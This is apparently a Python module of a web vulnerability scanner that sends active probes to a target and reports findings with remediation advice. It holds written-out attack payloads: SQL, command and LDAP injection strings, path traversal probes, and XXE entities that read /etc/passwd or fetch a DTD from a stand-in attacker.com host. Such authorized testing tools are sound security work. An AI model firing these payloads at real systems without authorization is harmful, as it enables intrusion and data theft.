"""
Active Probing Module
Performs authorized active security testing with advanced attack vectors
"""

import requests
from urllib.parse import urljoin, urlparse
from datetime import datetime
import time
import os


class ActiveProbe:
    def __init__(self, target_url, timeout=10):
        self.target_url = target_url
        self.timeout = timeout
        self.parsed_url = urlparse(target_url)
        self.base_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}"
        self.vulnerabilities = []

        # Load payloads
        self.sql_payloads = self._load_payloads("payloads/sql_injection.txt")
        self.xss_payloads = self._load_payloads("payloads/xss_payloads.txt")
        self.path_payloads = self._load_payloads("payloads/path_traversal.txt")

    def _load_payloads(self, filepath):
        """Load payloads from file"""
        try:
            if os.path.exists(filepath):
                with open(filepath, "r", encoding="utf-8") as f:
                    return [line.strip() for line in f if line.strip()]
            else:
                print(f"[-] Payload file not found: {filepath}")
                return []
        except Exception as e:
            print(f"[-] Error loading payloads from {filepath}: {str(e)}")
            return []

    def run_all_checks(self):
        """Execute all active probing checks"""
        print("[+] Starting active security probing...")

        self.check_sql_injection_advanced()
        self.check_xss_advanced()
        self.check_path_traversal()
        self.check_parameter_behavior()
        self.check_error_handling()
        self.check_common_endpoints()
        self.check_cors_configuration()
        self.check_backup_files()
        self.check_http_methods()
        self.check_xxe_injection()
        self.check_command_injection()
        self.check_ldap_injection()

        return {
            "timestamp": datetime.now().isoformat(),
            "total_findings": len(self.vulnerabilities),
            "vulnerabilities": self.vulnerabilities,
        }

    def add_vulnerability(
        self,
        title,
        description,
        severity,
        remediation,
        category,
        affected_url=None,
        evidence=None,
    ):
        """Add a vulnerability finding with optional evidence"""
        severity_scores = {"Critical": 10, "High": 8, "Medium": 5, "Low": 2, "Info": 0}

        vuln = {
            "title": title,
            "description": description,
            "severity": severity,
            "severity_score": severity_scores.get(severity, 0),
            "remediation": remediation,
            "category": category,
        }

        # Add affected URL if provided
        if affected_url:
            vuln["affected_url"] = affected_url

        # Add evidence if provided
        if evidence:
            vuln["evidence"] = evidence

        self.vulnerabilities.append(vuln)

    def safe_request(self, method, url, **kwargs):
        """Make a safe HTTP request with error handling"""
        try:
            kwargs["timeout"] = self.timeout
            kwargs["allow_redirects"] = False
            kwargs["verify"] = False
            response = requests.request(method, url, **kwargs)
            time.sleep(0.5)  # Rate limiting
            return response
        except Exception as e:
            return None

    def _build_request_string(self, method, url, headers=None, data=None):
        """Build HTTP request string for evidence"""
        parsed = urlparse(url)
        request_lines = [
            f"{method} {parsed.path}{'?' + parsed.query if parsed.query else ''} HTTP/1.1"
        ]
        request_lines.append(f"Host: {parsed.netloc}")

        if headers:
            for key, value in headers.items():
                request_lines.append(f"{key}: {value}")

        if data:
            request_lines.append("")
            request_lines.append(str(data))

        return "\n".join(request_lines)

    def check_sql_injection_advanced(self):
        """Advanced SQL injection detection with multiple techniques"""
        print("[*] Testing advanced SQL injection...")

        if not self.sql_payloads:
            print("[-] No SQL payloads loaded, skipping...")
            return

        # Test different injection types
        injection_types = {
            "error_based": ["'", '"', "' OR '1'='1", "1' AND '1'='1"],
            "time_based": [
                "' AND SLEEP(5)--",
                "1' AND SLEEP(5)--",
                "'; WAITFOR DELAY '0:0:5'--",
            ],
            "union_based": [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION ALL SELECT NULL--",
            ],
            "boolean_based": [
                "' AND 1=1--",
                "' AND 1=2--",
                "1' AND '1'='1",
                "1' AND '1'='2",
            ],
        }

        vulnerable_payloads = []
        first_evidence = None

        for injection_type, payloads in injection_types.items():
            for payload in payloads:
                test_url = f"{self.target_url}?id={payload}"

                start_time = time.time()
                response = self.safe_request("GET", test_url)
                elapsed_time = time.time() - start_time

                if response:
                    content = response.text.lower()

                    # Error-based detection
                    sql_errors = [
                        "sql syntax",
                        "mysql",
                        "postgresql",
                        "ora-",
                        "syntax error",
                        "unclosed quotation",
                        "quoted string not properly terminated",
                        "microsoft sql",
                        "odbc",
                        "jdbc",
                        "sqlite",
                        "mariadb",
                    ]

                    matched_error = None
                    for error in sql_errors:
                        if error in content:
                            matched_error = error
                            break

                    if matched_error:
                        vulnerable_payloads.append(
                            {"type": "Error-Based", "payload": payload, "url": test_url}
                        )

                        # Capture evidence for first detection
                        if not first_evidence:
                            first_evidence = {
                                "payload": payload,
                                "request": self._build_request_string("GET", test_url),
                                "response": response.text[:500],
                                "matched_pattern": f"SQL error pattern: '{matched_error}'",
                            }

                    # Time-based detection
                    if "sleep" in payload.lower() or "waitfor" in payload.lower():
                        if elapsed_time >= 4.5:
                            vulnerable_payloads.append(
                                {
                                    "type": "Time-Based Blind",
                                    "payload": payload,
                                    "url": test_url,
                                }
                            )

                            if not first_evidence:
                                first_evidence = {
                                    "payload": payload,
                                    "request": self._build_request_string(
                                        "GET", test_url
                                    ),
                                    "response": f"Response time: {elapsed_time:.2f} seconds (expected ~5s delay)",
                                    "matched_pattern": f"Time-based blind SQLi - delay of {elapsed_time:.2f}s detected",
                                }

                    # Boolean-based detection
                    if injection_type == "boolean_based":
                        if "1=1" in payload and response.status_code == 200:
                            false_payload = payload.replace("1=1", "1=2")
                            test_url_false = f"{self.target_url}?id={false_payload}"
                            response_false = self.safe_request("GET", test_url_false)

                            if response_false and len(response.text) != len(
                                response_false.text
                            ):
                                vulnerable_payloads.append(
                                    {
                                        "type": "Boolean-Based Blind",
                                        "payload": payload,
                                        "url": test_url,
                                    }
                                )

                                if not first_evidence:
                                    first_evidence = {
                                        "payload": f"True condition: {payload} | False condition: {false_payload}",
                                        "request": self._build_request_string(
                                            "GET", test_url
                                        ),
                                        "response": f"True response length: {len(response.text)} chars\nFalse response length: {len(response_false.text)} chars",
                                        "matched_pattern": f"Boolean-based SQLi - response difference: {abs(len(response.text) - len(response_false.text))} chars",
                                    }

        if vulnerable_payloads:
            payload_details = ", ".join(
                [f"{v['type']}: {v['payload']}" for v in vulnerable_payloads[:3]]
            )

            affected_urls = list(set([v["url"] for v in vulnerable_payloads[:5]]))

            self.add_vulnerability(
                title="SQL Injection Vulnerability Detected",
                description=f"Application is vulnerable to SQL injection. Detected types: {payload_details}",
                severity="Critical",
                remediation="Use parameterized queries/prepared statements. Implement input validation. Use ORM frameworks. Apply principle of least privilege to database accounts.",
                category="Injection",
                affected_url=affected_urls,
                evidence=first_evidence,
            )

    def check_xss_advanced(self):
        """Advanced XSS detection with multiple contexts"""
        print("[*] Testing advanced XSS vectors...")

        if not self.xss_payloads:
            print("[-] No XSS payloads loaded, skipping...")
            return

        vulnerable_contexts = []
        first_evidence = None

        for payload in self.xss_payloads[:30]:
            test_url = f"{self.target_url}?search={payload}"
            response = self.safe_request("GET", test_url)

            if response and response.status_code == 200:
                content = response.text

                if payload in content:
                    context = self._detect_xss_context(content, payload)
                    vulnerable_contexts.append(
                        {"payload": payload, "context": context, "url": test_url}
                    )

                    if not first_evidence:
                        payload_index = content.find(payload)
                        snippet_start = max(0, payload_index - 100)
                        snippet_end = min(
                            len(content), payload_index + len(payload) + 100
                        )

                        first_evidence = {
                            "payload": payload,
                            "request": self._build_request_string("GET", test_url),
                            "response": content[snippet_start:snippet_end],
                            "matched_pattern": f"Payload reflected in {context}",
                        }

                xss_indicators = [
                    "<script",
                    "onerror",
                    "onload",
                    "javascript:",
                    "alert(",
                ]

                if any(indicator in content.lower() for indicator in xss_indicators):
                    if any(
                        indicator in payload.lower() for indicator in xss_indicators
                    ):
                        vulnerable_contexts.append(
                            {
                                "payload": payload,
                                "context": "Potential XSS",
                                "url": test_url,
                            }
                        )

                        if not first_evidence:
                            first_evidence = {
                                "payload": payload,
                                "request": self._build_request_string("GET", test_url),
                                "response": content[:500],
                                "matched_pattern": "XSS payload indicators found in response",
                            }

        if vulnerable_contexts:
            unique_contexts = set([v["context"] for v in vulnerable_contexts])
            context_details = ", ".join(unique_contexts)
            example_payload = vulnerable_contexts[0]["payload"]
            affected_urls = list(set([v["url"] for v in vulnerable_contexts[:5]]))

            self.add_vulnerability(
                title="Cross-Site Scripting (XSS) Vulnerability",
                description=f"Application reflects user input without proper encoding. Vulnerable contexts: {context_details}. Example payload: {example_payload[:50]}",
                severity="High",
                remediation="Implement context-aware output encoding. Use Content Security Policy (CSP). Sanitize user input. Use frameworks with auto-escaping.",
                category="XSS",
                affected_url=affected_urls,
                evidence=first_evidence,
            )

    def _detect_xss_context(self, content, payload):
        """Detect the context where XSS payload appears"""
        payload_index = content.find(payload)

        if payload_index == -1:
            return "Unknown"

        start = max(0, payload_index - 50)
        end = min(len(content), payload_index + len(payload) + 50)
        context_snippet = content[start:end]

        if "<script" in context_snippet or "</script>" in context_snippet:
            return "JavaScript Context"
        elif "href=" in context_snippet or "src=" in context_snippet:
            return "Attribute Context"
        elif "<" in context_snippet and ">" in context_snippet:
            return "HTML Context"
        else:
            return "Text Context"

    def check_path_traversal(self):
        """Test for path traversal vulnerabilities"""
        print("[*] Testing path traversal attacks...")

        if not self.path_payloads:
            print("[-] No path traversal payloads loaded, skipping...")
            return

        vulnerable_payloads = []
        first_evidence = None

        for payload in self.path_payloads[:20]:
            test_url = f"{self.target_url}?file={payload}"
            response = self.safe_request("GET", test_url)

            if response and response.status_code == 200:
                content = response.text.lower()

                success_indicators = [
                    "root:",
                    "[extensions]",
                    "[boot loader]",
                    "bin/bash",
                    "bin/sh",
                ]

                matched_indicator = None
                for indicator in success_indicators:
                    if indicator in content:
                        matched_indicator = indicator
                        break

                if matched_indicator:
                    vulnerable_payloads.append({"payload": payload, "url": test_url})

                    if not first_evidence:
                        indicator_index = content.find(matched_indicator)
                        snippet_start = max(0, indicator_index - 50)
                        snippet_end = min(len(content), indicator_index + 200)

                        first_evidence = {
                            "payload": payload,
                            "request": self._build_request_string("GET", test_url),
                            "response": response.text[snippet_start:snippet_end],
                            "matched_pattern": f"Path traversal success - file content indicator: '{matched_indicator}'",
                        }

        if vulnerable_payloads:
            payload_list = ", ".join([v["payload"] for v in vulnerable_payloads[:3]])
            affected_urls = [v["url"] for v in vulnerable_payloads[:5]]

            self.add_vulnerability(
                title="Path Traversal Vulnerability",
                description=f"Application allows directory traversal attacks. Successful payloads: {payload_list}",
                severity="High",
                remediation="Validate and sanitize file paths. Use whitelisting for allowed files. Implement chroot jail. Avoid direct file access based on user input.",
                category="Path Traversal",
                affected_url=affected_urls,
                evidence=first_evidence,
            )

    def check_xxe_injection(self):
        """Test for XML External Entity injection"""
        print("[*] Testing XXE injection...")

        xxe_payloads = [
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><foo>test</foo>""",
        ]

        headers = {"Content-Type": "application/xml"}

        for payload in xxe_payloads:
            response = self.safe_request(
                "POST", self.target_url, data=payload, headers=headers
            )

            if response and response.status_code == 200:
                content = response.text.lower()

                xxe_indicators = ["root:", "[extensions]", "bin/bash"]

                matched_indicator = None
                for indicator in xxe_indicators:
                    if indicator in content:
                        matched_indicator = indicator
                        break

                if matched_indicator:
                    evidence = {
                        "payload": payload[:200] + "...",
                        "request": self._build_request_string(
                            "POST", self.target_url, headers=headers, data=payload[:200]
                        ),
                        "response": response.text[:500],
                        "matched_pattern": f"XXE success - file content indicator: '{matched_indicator}'",
                    }

                    self.add_vulnerability(
                        title="XML External Entity (XXE) Injection",
                        description="Application processes XML entities without proper validation, allowing file disclosure.",
                        severity="Critical",
                        remediation="Disable XML external entity processing. Use less complex data formats (JSON). Update XML parsers. Implement input validation.",
                        category="Injection",
                        affected_url=self.target_url,
                        evidence=evidence,
                    )
                    break

    def check_command_injection(self):
        """Test for OS command injection"""
        print("[*] Testing command injection...")

        command_payloads = [
            "; whoami",
            "| whoami",
            "& whoami",
            "; ls",
            "| ls",
            "& dir",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
        ]

        for payload in command_payloads:
            test_url = f"{self.target_url}?cmd={payload}"
            response = self.safe_request("GET", test_url)

            if response and response.status_code == 200:
                content = response.text.lower()

                command_indicators = [
                    "root:",
                    "uid=",
                    "gid=",
                    "volume serial number",
                    "directory of",
                    "total ",
                    "drwxr",
                ]

                matched_indicator = None
                for indicator in command_indicators:
                    if indicator in content:
                        matched_indicator = indicator
                        break

                if matched_indicator:
                    evidence = {
                        "payload": payload,
                        "request": self._build_request_string("GET", test_url),
                        "response": response.text[:500],
                        "matched_pattern": f"Command injection success - output indicator: '{matched_indicator}'",
                    }

                    self.add_vulnerability(
                        title="OS Command Injection Vulnerability",
                        description=f"Application executes OS commands based on user input. Vulnerable payload: {payload}",
                        severity="Critical",
                        remediation="Never pass user input to system commands. Use parameterized APIs. Implement strict input validation. Use whitelist approach.",
                        category="Injection",
                        affected_url=test_url,
                        evidence=evidence,
                    )
                    break

    def check_ldap_injection(self):
        """Test for LDAP injection"""
        print("[*] Testing LDAP injection...")

        ldap_payloads = [
            "*",
            "*)(&",
            "*)(uid=*))(|(uid=*",
            "admin*",
            "admin*)((|userPassword=*",
        ]

        for payload in ldap_payloads:
            test_url = f"{self.target_url}?username={payload}"
            response = self.safe_request("GET", test_url)

            if response and response.status_code == 200:
                content = response.text.lower()

                ldap_indicators = [
                    "ldap",
                    "directory",
                    "naming exception",
                    "javax.naming",
                ]

                matched_indicator = None
                for indicator in ldap_indicators:
                    if indicator in content:
                        matched_indicator = indicator
                        break

                if matched_indicator:
                    evidence = {
                        "payload": payload,
                        "request": self._build_request_string("GET", test_url),
                        "response": response.text[:500],
                        "matched_pattern": f"LDAP error indicator: '{matched_indicator}'",
                    }

                    self.add_vulnerability(
                        title="LDAP Injection Vulnerability",
                        description="Application vulnerable to LDAP injection attacks through user input.",
                        severity="High",
                        remediation="Use parameterized LDAP queries. Escape special LDAP characters. Implement input validation.",
                        category="Injection",
                        affected_url=test_url,
                        evidence=evidence,
                    )
                    break

    def check_parameter_behavior(self):
        """Test how application handles special characters in parameters"""
        test_params = [
            ("'", "SQL Injection Pattern"),
            ("<script>", "XSS Pattern"),
            ("../", "Path Traversal Pattern"),
            ("${7*7}", "Template Injection Pattern"),
        ]

        for payload, pattern_name in test_params:
            test_url = f"{self.target_url}?test={payload}"
            response = self.safe_request("GET", test_url)

            if response and response.status_code == 200:
                content = response.text.lower()

                if payload.lower() in content:
                    evidence = {
                        "payload": payload,
                        "request": self._build_request_string("GET", test_url),
                        "response": content[:500],
                        "matched_pattern": f"Input reflected without encoding",
                    }

                    self.add_vulnerability(
                        title=f"Input Reflection Detected - {pattern_name}",
                        description=f'User input "{payload}" is reflected in the response without proper encoding.',
                        severity="Medium",
                        remediation="Implement proper input validation and output encoding. Use context-aware escaping.",
                        category="Input Validation",
                        affected_url=test_url,
                        evidence=evidence,
                    )

                if payload == "'" and any(
                    err in content
                    for err in ["sql", "mysql", "syntax", "database", "query"]
                ):
                    sql_error = next(
                        (
                            err
                            for err in ["sql", "mysql", "syntax", "database", "query"]
                            if err in content
                        ),
                        None,
                    )

                    evidence = {
                        "payload": payload,
                        "request": self._build_request_string("GET", test_url),
                        "response": content[:500],
                        "matched_pattern": f"SQL error keyword: '{sql_error}'",
                    }

                    self.add_vulnerability(
                        title="Potential SQL Injection Vulnerability",
                        description="Application returns database error messages when special characters are used.",
                        severity="High",
                        remediation="Use parameterized queries/prepared statements. Never concatenate user input into SQL queries.",
                        category="Injection",
                        affected_url=test_url,
                        evidence=evidence,
                    )

    def check_error_handling(self):
        """Test error handling and information disclosure"""
        error_urls = [
            ("nonexistent-page-12345", "Non-existent Page"),
            ("..%2F..%2F..%2Fetc%2Fpasswd", "Path Traversal Attempt"),
            ("%00", "Null Byte"),
        ]

        for path, test_name in error_urls:
            test_url = urljoin(self.base_url, path)
            response = self.safe_request("GET", test_url)

            if response:
                content = response.text.lower()

                stack_trace_patterns = [
                    "traceback",
                    "stack trace",
                    "exception",
                    "at line",
                    "error in",
                    "warning:",
                    "fatal error",
                    "mysql_",
                    "postgresql",
                ]

                matched_pattern = None
                for pattern in stack_trace_patterns:
                    if pattern in content:
                        matched_pattern = pattern
                        break

                if matched_pattern:
                    evidence = {
                        "payload": path,
                        "request": self._build_request_string("GET", test_url),
                        "response": response.text[:500],
                        "matched_pattern": f"Error disclosure pattern: '{matched_pattern}'",
                    }

                    self.add_vulnerability(
                        title="Verbose Error Messages Detected",
                        description=f"Application exposes detailed error information in response to {test_name}.",
                        severity="Low",
                        remediation="Implement custom error pages. Log detailed errors server-side, show generic messages to users.",
                        category="Information Disclosure",
                        affected_url=test_url,
                        evidence=evidence,
                    )
                    break

    def check_common_endpoints(self):
        """Check for common sensitive endpoints"""
        sensitive_paths = [
            "/admin",
            "/administrator",
            "/wp-admin",
            "/phpmyadmin",
            "/cpanel",
            "/login",
            "/admin/login",
            "/dashboard",
            "/.git/HEAD",
            "/.env",
            "/config.php",
            "/backup",
            "/phpinfo.php",
            "/test.php",
            "/debug",
            "/.DS_Store",
            "/web.config",
        ]

        found_endpoints = []

        for path in sensitive_paths:
            url = urljoin(self.base_url, path)
            response = self.safe_request("GET", url)

            if response and response.status_code in [200, 301, 302, 401, 403]:
                found_endpoints.append(
                    {"path": path, "status": response.status_code, "url": url}
                )

        if found_endpoints:
            paths_list = ", ".join(
                [f"{e['path']} ({e['status']})" for e in found_endpoints]
            )

            severity = "Info"
            if any(e["status"] == 200 for e in found_endpoints):
                if any(
                    path in [e["path"] for e in found_endpoints]
                    for path in ["/.git/HEAD", "/.env", "/phpinfo.php"]
                ):
                    severity = "High"
                else:
                    severity = "Medium"

            affected_urls = [e["url"] for e in found_endpoints]

            # Get evidence from first 200 response
            first_200 = next((e for e in found_endpoints if e["status"] == 200), None)
            evidence = None
            if first_200:
                resp = self.safe_request("GET", first_200["url"])
                if resp:
                    evidence = {
                        "payload": "N/A",
                        "request": self._build_request_string("GET", first_200["url"]),
                        "response": resp.text[:500],
                        "matched_pattern": f"Sensitive endpoint accessible with status {first_200['status']}",
                    }

            self.add_vulnerability(
                title="Sensitive Endpoints Discovered",
                description=f"Found accessible sensitive paths: {paths_list}",
                severity=severity,
                remediation="Restrict access to administrative interfaces. Remove development/debug files. Use .htaccess or firewall rules.",
                category="Access Control",
                affected_url=affected_urls,
                evidence=evidence,
            )

    def check_cors_configuration(self):
        """Test CORS configuration for misconfigurations"""
        headers = {
            "Origin": "https://evil.com",
            "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "Content-Type",
        }

        response = self.safe_request("OPTIONS", self.target_url, headers=headers)

        if response:
            cors_header = response.headers.get("Access-Control-Allow-Origin", "")

            if cors_header == "*":
                evidence = {
                    "payload": "Origin: https://evil.com",
                    "request": self._build_request_string(
                        "OPTIONS", self.target_url, headers=headers
                    ),
                    "response": f"Access-Control-Allow-Origin: {cors_header}",
                    "matched_pattern": "CORS allows wildcard origin (*)",
                }

                self.add_vulnerability(
                    title="CORS Wildcard Origin Allowed",
                    description="CORS policy allows requests from any origin (*).",
                    severity="Medium",
                    remediation="Restrict CORS to specific trusted domains. Avoid using wildcard (*) in production.",
                    category="CORS",
                    affected_url=self.target_url,
                    evidence=evidence,
                )
            elif cors_header == "https://evil.com":
                evidence = {
                    "payload": "Origin: https://evil.com",
                    "request": self._build_request_string(
                        "OPTIONS", self.target_url, headers=headers
                    ),
                    "response": f"Access-Control-Allow-Origin: {cors_header}",
                    "matched_pattern": "CORS reflects arbitrary origin without validation",
                }

                self.add_vulnerability(
                    title="CORS Reflects Arbitrary Origins",
                    description="CORS policy reflects the requesting origin without validation.",
                    severity="High",
                    remediation="Implement whitelist of allowed origins. Validate Origin header against trusted domains.",
                    category="CORS",
                    affected_url=self.target_url,
                    evidence=evidence,
                )

            allow_creds = response.headers.get(
                "Access-Control-Allow-Credentials", ""
            ).lower()
            if allow_creds == "true" and cors_header == "*":
                evidence = {
                    "payload": "Origin: https://evil.com",
                    "request": self._build_request_string(
                        "OPTIONS", self.target_url, headers=headers
                    ),
                    "response": f"Access-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true",
                    "matched_pattern": "Wildcard origin with credentials enabled",
                }

                self.add_vulnerability(
                    title="CORS Credentials with Wildcard Origin",
                    description="CORS allows credentials with wildcard origin (not allowed by spec but worth checking).",
                    severity="High",
                    remediation="Never use wildcard origin with credentials. Specify exact origins.",
                    category="CORS",
                    affected_url=self.target_url,
                    evidence=evidence,
                )

    def check_backup_files(self):
        """Check for common backup file patterns"""
        parsed = urlparse(self.target_url)
        path = parsed.path if parsed.path else "/index.html"

        backup_extensions = [
            ".bak",
            ".old",
            ".backup",
            ".copy",
            ".orig",
            ".save",
            ".swp",
            "~",
        ]

        found_backups = []

        for ext in backup_extensions:
            backup_url = self.target_url + ext
            response = self.safe_request("GET", backup_url)

            if response and response.status_code == 200:
                found_backups.append(backup_url)

        if found_backups:
            # Get evidence from first backup
            first_backup_resp = self.safe_request("GET", found_backups[0])
            evidence = None
            if first_backup_resp:
                evidence = {
                    "payload": "N/A",
                    "request": self._build_request_string("GET", found_backups[0]),
                    "response": first_backup_resp.text[:500],
                    "matched_pattern": f"Backup file accessible with extension",
                }

            self.add_vulnerability(
                title="Backup Files Accessible",
                description=f'Found accessible backup files: {", ".join(found_backups)}',
                severity="Medium",
                remediation="Remove backup files from web-accessible directories. Use proper backup storage solutions.",
                category="Information Disclosure",
                affected_url=found_backups,
                evidence=evidence,
            )

    def check_http_methods(self):
        """Test for dangerous HTTP methods"""
        dangerous_methods = ["PUT", "DELETE", "TRACE", "CONNECT"]

        allowed_methods = []

        response = self.safe_request("OPTIONS", self.target_url)
        if response and "Allow" in response.headers:
            allowed = response.headers["Allow"].upper()
            allowed_methods = [m for m in dangerous_methods if m in allowed]
        else:
            for method in dangerous_methods:
                response = self.safe_request(method, self.target_url)
                if response and response.status_code not in [404, 405, 501]:
                    allowed_methods.append(method)

        if allowed_methods:
            evidence = {
                "payload": "OPTIONS request",
                "request": self._build_request_string("OPTIONS", self.target_url),
                "response": f"Allow: {', '.join(allowed_methods)}",
                "matched_pattern": f"Dangerous HTTP methods enabled: {', '.join(allowed_methods)}",
            }

            self.add_vulnerability(
                title="Dangerous HTTP Methods Enabled",
                description=f'Server accepts potentially dangerous HTTP methods: {", ".join(allowed_methods)}',
                severity="Medium",
                remediation="Disable unnecessary HTTP methods at web server level. Only allow required methods.",
                category="HTTP Configuration",
                affected_url=self.target_url,
                evidence=evidence,
            )
